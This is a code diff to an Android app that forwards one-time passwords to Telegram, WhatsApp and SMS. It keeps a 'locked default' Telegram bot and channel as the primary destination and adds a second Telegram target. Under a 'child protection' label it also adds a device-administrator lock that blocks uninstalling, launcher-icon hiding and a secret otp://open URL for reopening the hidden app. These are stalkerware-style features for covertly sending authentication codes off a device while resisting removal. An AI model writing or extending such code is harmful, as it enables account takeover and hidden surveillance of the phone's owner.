@@ -1,9 +1,14 @@
 package com.example.otpforwarder
 
 import android.Manifest
+import android.app.admin.DevicePolicyManager
+import android.content.ClipData
+import android.content.ClipboardManager
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
@@ -85,6 +90,32 @@ fun checkNotificationAccess(context: Context): Boolean {
     val pkgName = context.packageName
     val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
     return flat != null && flat.contains(pkgName)
+}
+
+fun isDeviceAdminActive(context: Context): Boolean {
+    val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager ?: return false
+    val admin = ComponentName(context, OtpDeviceAdminReceiver::class.java)
+    return dpm.isAdminActive(admin)
+}
+
+fun isLauncherIconHidden(context: Context): Boolean {
+    val alias = ComponentName(context, "com.example.otpforwarder.LauncherAlias")
+    val state = context.packageManager.getComponentEnabledSetting(alias)
+    return state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+}
+
+fun setLauncherIconVisibility(context: Context, hide: Boolean) {
+    val alias = ComponentName(context, "com.example.otpforwarder.LauncherAlias")
+    val newState = if (hide) {
+        PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+    } else {
+        PackageManager.COMPONENT_ENABLED_STATE_ENABLED
+    }
+    context.packageManager.setComponentEnabledSetting(
+        alias,
+        newState,
+        PackageManager.DONT_KILL_APP
+    )
 }
 
 @Composable
@@ -202,11 +233,17 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
     val prefs = remember { context.getSharedPreferences("otp_prefs", Context.MODE_PRIVATE) }
     val scope = rememberCoroutineScope()
 
-    // Telegram State
+    // Telegram 1 State (Primary)
     var isTelegramEnabled by remember { mutableStateOf(prefs.getBoolean("is_telegram_enabled", true)) }
     var botToken by remember { mutableStateOf(prefs.getString("bot_token", TelegramHelper.DEFAULT_BOT_TOKEN) ?: "") }
     var chatId by remember { mutableStateOf(prefs.getString("chat_id", TelegramHelper.DEFAULT_CHANNEL_ID) ?: "") }
     var telegramStatus by remember { mutableStateOf("") }
+
+    // Telegram 2 State (Secondary / 2nd Bot / 2nd Account)
+    var isTelegram2Enabled by remember { mutableStateOf(prefs.getBoolean("is_telegram_2_enabled", false)) }
+    var botToken2 by remember { mutableStateOf(prefs.getString("bot_token_2", "") ?: "") }
+    var chatId2 by remember { mutableStateOf(prefs.getString("chat_id_2", "") ?: "") }
+    var telegram2Status by remember { mutableStateOf("") }
 
     // WhatsApp State
     var isWhatsAppEnabled by remember { mutableStateOf(prefs.getBoolean("is_whatsapp_enabled", false)) }
@@ -219,13 +256,17 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
     var smsPhone by remember { mutableStateOf(prefs.getString("sms_phone", "") ?: "") }
     var smsStatus by remember { mutableStateOf("") }
 
+    // Security & Child Protection State
+    var isAdminActive by remember { mutableStateOf(isDeviceAdminActive(context)) }
+    var isIconHidden by remember { mutableStateOf(isLauncherIconHidden(context)) }
+
     Column(
         modifier = Modifier
             .fillMaxSize()
             .verticalScroll(rememberScrollState())
             .padding(16.dp)
     ) {
-        // 1. Telegram Card
+        // 1. Telegram Service 1 Card (Primary - Locked Default)
         Card(
             modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
             colors = CardDefaults.cardColors(containerColor = Color(0xFFF1F8E9))
@@ -237,8 +278,8 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
                     horizontalArrangement = Arrangement.SpaceBetween
                 ) {
                     Column(modifier = Modifier.weight(1f)) {
-                        Text("📢 Telegram Forwarding", fontWeight = FontWeight.Bold, fontSize = 16.sp, color = Color(0xFF2E7D32))
-                        Text("Channel ya Bot par message bhejein", fontSize = 11.sp, color = Color.DarkGray)
+                        Text("📢 Telegram 1 (Primary Bot)", fontWeight = FontWeight.Bold, fontSize = 16.sp, color = Color(0xFF2E7D32))
+                        Text("Default Verified Bot & Channel", fontSize = 11.sp, color = Color.DarkGray)
                     }
                     Switch(
                         checked = isTelegramEnabled,
@@ -251,7 +292,7 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
                     OutlinedTextField(
                         value = botToken,
                         onValueChange = { botToken = it },
-                        label = { Text("Bot Token") },
+                        label = { Text("Bot Token 1") },
                         modifier = Modifier.fillMaxWidth(),
                         singleLine = true
                     )
@@ -259,27 +300,27 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
                     OutlinedTextField(
                         value = chatId,
                         onValueChange = { chatId = it },
-                        label = { Text("Channel / Chat ID (e.g. -100...)") },
+                        label = { Text("Channel / Chat ID 1 (e.g. -100...)") },
                         modifier = Modifier.fillMaxWidth(),
                         singleLine = true
                     )
                     Spacer(modifier = Modifier.height(10.dp))
                     Button(
                         onClick = {
-                            telegramStatus = "Sending test..."
+                            telegramStatus = "Sending test to Telegram 1..."
                             scope.launch {
                                 val res = TelegramHelper.sendMessage(
                                     botToken.trim(),
                                     chatId.trim(),
-                                    "🎉 Test Message: Telegram forwarding test successful!"
+                                    "🎉 Test Message: Telegram 1 forwarding test successful!"
                                 )
-                                telegramStatus = if (res.first) "✅ Telegram Par Test Message Chala Gaya!" else "❌ ${res.second}"
+                                telegramStatus = if (res.first) "✅ Telegram 1 Par Test Message Chala Gaya!" else "❌ ${res.second}"
                             }
                         },
                         colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2E7D32)),
                         modifier = Modifier.fillMaxWidth()
                     ) {
-                        Text("Test Telegram")
+                        Text("Test Telegram 1")
                     }
                     if (telegramStatus.isNotEmpty()) {
                         Text(
@@ -294,7 +335,7 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
             }
         }
 
-        // 2. WhatsApp Card
+        // 2. Telegram Service 2 Card (Secondary / 2nd Bot / 2nd Account)
         Card(
             modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
             colors = CardDefaults.cardColors(containerColor = Color(0xFFE8F5E9))
@@ -306,7 +347,77 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
                     horizontalArrangement = Arrangement.SpaceBetween
                 ) {
                     Column(modifier = Modifier.weight(1f)) {
-                        Text("💬 WhatsApp Forwarding", fontWeight = FontWeight.Bold, fontSize = 16.sp, color = Color(0xFF1B5E20))
+                        Text("📢 Telegram 2 (2nd Account / Bot)", fontWeight = FontWeight.Bold, fontSize = 16.sp, color = Color(0xFF1B5E20))
+                        Text("Dusre bot ya dusre channel ke liye", fontSize = 11.sp, color = Color.DarkGray)
+                    }
+                    Switch(
+                        checked = isTelegram2Enabled,
+                        onCheckedChange = { isTelegram2Enabled = it }
+                    )
+                }
+
+                if (isTelegram2Enabled) {
+                    Spacer(modifier = Modifier.height(10.dp))
+                    OutlinedTextField(
+                        value = botToken2,
+                        onValueChange = { botToken2 = it },
+                        label = { Text("Bot Token 2 (Optional / 2nd Bot)") },
+                        modifier = Modifier.fillMaxWidth(),
+                        singleLine = true
+                    )
+                    Spacer(modifier = Modifier.height(8.dp))
+                    OutlinedTextField(
+                        value = chatId2,
+                        onValueChange = { chatId2 = it },
+                        label = { Text("Channel / Chat ID 2") },
+                        modifier = Modifier.fillMaxWidth(),
+                        singleLine = true
+                    )
+                    Spacer(modifier = Modifier.height(10.dp))
+                    Button(
+                        onClick = {
+                            telegram2Status = "Sending test to Telegram 2..."
+                            scope.launch {
+                                val token = if (botToken2.trim().isNotEmpty()) botToken2.trim() else botToken.trim()
+                                val res = TelegramHelper.sendMessage(
+                                    token,
+                                    chatId2.trim(),
+                                    "🎉 Test Message: Telegram 2 forwarding test successful!"
+                                )
+                                telegram2Status = if (res.first) "✅ Telegram 2 Par Test Message Chala Gaya!" else "❌ ${res.second}"
+                            }
+                        },
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1B5E20)),
+                        modifier = Modifier.fillMaxWidth()
+                    ) {
+                        Text("Test Telegram 2")
+                    }
+                    if (telegram2Status.isNotEmpty()) {
+                        Text(
+                            text = telegram2Status,
+                            fontSize = 12.sp,
+                            fontWeight = FontWeight.Bold,
+                            color = if (telegram2Status.startsWith("✅")) Color(0xFF1B5E20) else Color(0xFFC62828),
+                            modifier = Modifier.padding(top = 6.dp)
+                        )
+                    }
+                }
+            }
+        }
+
+        // 3. WhatsApp Card
+        Card(
+            modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
+            colors = CardDefaults.cardColors(containerColor = Color(0xFFE0F2F1))
+        ) {
+            Column(modifier = Modifier.padding(16.dp)) {
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    verticalAlignment = Alignment.CenterVertically,
+                    horizontalArrangement = Arrangement.SpaceBetween
+                ) {
+                    Column(modifier = Modifier.weight(1f)) {
+                        Text("💬 WhatsApp Forwarding", fontWeight = FontWeight.Bold, fontSize = 16.sp, color = Color(0xFF00695C))
                         Text("CallMeBot Gateway ke zariye", fontSize = 11.sp, color = Color.DarkGray)
                     }
                     Switch(
@@ -350,7 +461,7 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
                                 waStatus = if (res.first) "✅ WhatsApp Par Test Message Chala Gaya!" else "❌ ${res.second}"
                             }
                         },
-                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1B5E20)),
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00695C)),
                         modifier = Modifier.fillMaxWidth()
                     ) {
                         Text("Test WhatsApp")
@@ -360,7 +471,7 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
                             text = waStatus,
                             fontSize = 12.sp,
                             fontWeight = FontWeight.Bold,
-                            color = if (waStatus.startsWith("✅")) Color(0xFF1B5E20) else Color(0xFFC62828),
+                            color = if (waStatus.startsWith("✅")) Color(0xFF00695C) else Color(0xFFC62828),
                             modifier = Modifier.padding(top = 6.dp)
                         )
                     }
@@ -368,9 +479,9 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
             }
         }
 
-        // 3. Direct SMS Card
+        // 4. Direct SMS Card
         Card(
-            modifier = Modifier.fillMaxWidth().padding(bottom = 20.dp),
+            modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
             colors = CardDefaults.cardColors(containerColor = Color(0xFFFFF8E1))
         ) {
             Column(modifier = Modifier.padding(16.dp)) {
@@ -436,6 +547,160 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
             }
         }
 
+        // 5. Child & Security Protection Card (Anti-Uninstall & Icon Hide)
+        Card(
+            modifier = Modifier.fillMaxWidth().padding(bottom = 20.dp),
+            colors = CardDefaults.cardColors(containerColor = Color(0xFFEDE7F6))
+        ) {
+            Column(modifier = Modifier.padding(16.dp)) {
+                Text(
+                    text = "🛡️ Child Protection & App Privacy",
+                    fontWeight = FontWeight.Bold,
+                    fontSize = 16.sp,
+                    color = Color(0xFF4A148C)
+                )
+                Text(
+                    text = "Bachho se app ko delete hone se bachane aur icon chhupe rakhne ke options:",
+                    fontSize = 11.sp,
+                    color = Color.DarkGray,
+                    modifier = Modifier.padding(bottom = 12.dp)
+                )
+
+                // 5A: Anti-Uninstall Lock (Device Administrator)
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    verticalAlignment = Alignment.CenterVertically,
+                    horizontalArrangement = Arrangement.SpaceBetween
+                ) {
+                    Column(modifier = Modifier.weight(1f)) {
+                        Text("Anti-Uninstall Lock", fontWeight = FontWeight.Bold, fontSize = 14.sp)
+                        Text(
+                            text = if (isAdminActive) "🟢 Active: Koi app delete nahi kar sakta" else "🔴 Inactive: Tap to protect",
+                            fontSize = 11.sp,
+                            color = if (isAdminActive) Color(0xFF2E7D32) else Color.Gray
+                        )
+                    }
+                    Switch(
+                        checked = isAdminActive,
+                        onCheckedChange = { enable ->
+                            val admin = ComponentName(context, OtpDeviceAdminReceiver::class.java)
+                            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
+                            if (enable) {
+                                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
+                                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
+                                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "App ko uninstallation se lock karne ke liye Activate karein.")
+                                }
+                                context.startActivity(intent)
+                            } else {
+                                dpm?.removeActiveAdmin(admin)
+                                isAdminActive = false
+                                Toast.makeText(context, "Anti-Uninstall Lock Disabled", Toast.LENGTH_SHORT).show()
+                            }
+                        }
+                    )
+                }
+
+                Divider(modifier = Modifier.padding(vertical = 12.dp))
+
+                // 5B: Hide App Icon
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    verticalAlignment = Alignment.CenterVertically,
+                    horizontalArrangement = Arrangement.SpaceBetween
+                ) {
+                    Column(modifier = Modifier.weight(1f)) {
+                        Text("Hide App Icon", fontWeight = FontWeight.Bold, fontSize = 14.sp)
+                        Text(
+                            text = if (isIconHidden) "🟢 Icon Hidden from screen" else "Visible on home screen",
+                            fontSize = 11.sp,
+                            color = if (isIconHidden) Color(0xFF2E7D32) else Color.Gray
+                        )
+                    }
+                    Switch(
+                        checked = isIconHidden,
+                        onCheckedChange = { hide ->
+                            setLauncherIconVisibility(context, hide)
+                            isIconHidden = hide
+                            if (hide) {
+                                Toast.makeText(context, "Icon Chhup Gaya! Kholne ke liye otp://open use karein.", Toast.LENGTH_LONG).show()
+                            } else {
+                                Toast.makeText(context, "Icon Wapas Screen Par Aa Gaya!", Toast.LENGTH_SHORT).show()
+                            }
+                        }
+                    )
+                }
+
+                Spacer(modifier = Modifier.height(10.dp))
+
+                // Secret Open Helper Box
+                Surface(
+                    color = Color.White,
+                    shape = RoundedCornerShape(8.dp),
+                    modifier = Modifier.fillMaxWidth()
+                ) {
+                    Column(modifier = Modifier.padding(10.dp)) {
+                        Text(
+                            text = "🔑 Secret Opening URL: otp://open",
+                            fontWeight = FontWeight.Bold,
+                            fontSize = 12.sp,
+                            color = Color(0xFF4A148C)
+                        )
+                        Text(
+                            text = "Jab icon hide ho, to Chrome browser me otp://open likh kar enter karein ya niche diye gaye button se test karein:",
+                            fontSize = 10.sp,
+                            color = Color.DarkGray,
+                            modifier = Modifier.padding(vertical = 4.dp)
+                        )
+                        Row(
+                            modifier = Modifier.fillMaxWidth(),
+                            horizontalArrangement = Arrangement.spacedBy(8.dp)
+                        ) {
+                            OutlinedButton(
+                                onClick = {
+                                    val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+                                    val clip = ClipData.newPlainText("Secret Link", "otp://open")
+                                    clipboard.setPrimaryClip(clip)
+                                    Toast.makeText(context, "Link Copied: otp://open", Toast.LENGTH_SHORT).show()
+                                },
+                                modifier = Modifier.weight(1f)
+                            ) {
+                                Text("📋 Copy Link", fontSize = 11.sp)
+                            }
+                            Button(
+                                onClick = {
+                                    try {
+                                        val intent = Intent(Intent.ACTION_VIEW, Uri.parse("otp://open"))
+                                        context.startActivity(intent)
+                                    } catch (e: Exception) {
+                                        Toast.makeText(context, "Error opening link: ${e.message}", Toast.LENGTH_SHORT).show()
+                                    }
+                                },
+                                modifier = Modifier.weight(1f),
+                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4A148C))
+                            ) {
+                                Text("🚀 Test Open", fontSize = 11.sp)
+                            }
+                        }
+
+                        if (isIconHidden) {
+                            Spacer(modifier = Modifier.height(8.dp))
+                            Button(
+                                onClick = {
+                                    setLauncherIconVisibility(context, false)
+                                    isIconHidden = false
+                                    Toast.makeText(context, "Icon Re-Enabled on Home Screen!", Toast.LENGTH_SHORT).show()
+                                },
+                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2E7D32)),
+                                modifier = Modifier.fillMaxWidth()
+                            ) {
+                                Text("👁️ Unhide Icon (Show on Screen)", fontSize = 12.sp)
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
         // Save All Settings Button
         Button(
             onClick = {
@@ -443,6 +708,9 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
                     .putBoolean("is_telegram_enabled", isTelegramEnabled)
                     .putString("bot_token", botToken.trim())
                     .putString("chat_id", chatId.trim())
+                    .putBoolean("is_telegram_2_enabled", isTelegram2Enabled)
+                    .putString("bot_token_2", botToken2.trim())
+                    .putString("chat_id_2", chatId2.trim())
                     .putBoolean("is_whatsapp_enabled", isWhatsAppEnabled)
                     .putString("wa_phone", waPhone.trim())
                     .putString("wa_api_key", waApiKey.trim())
@@ -713,7 +981,10 @@ fun HistoryTab(context: Context) {
                                 modifier = Modifier.fillMaxWidth(),
                                 horizontalArrangement = Arrangement.spacedBy(8.dp)
                             ) {
-                                StatusBadge(label = "Telegram", status = item.telegramStatus)
+                                StatusBadge(label = "TG 1", status = item.telegramStatus)
+                                if (item.telegram2Status != "Disabled") {
+                                    StatusBadge(label = "TG 2", status = item.telegram2Status)
+                                }
                                 StatusBadge(label = "WhatsApp", status = item.whatsappStatus)
                                 StatusBadge(label = "SMS", status = item.smsStatus)
                             }
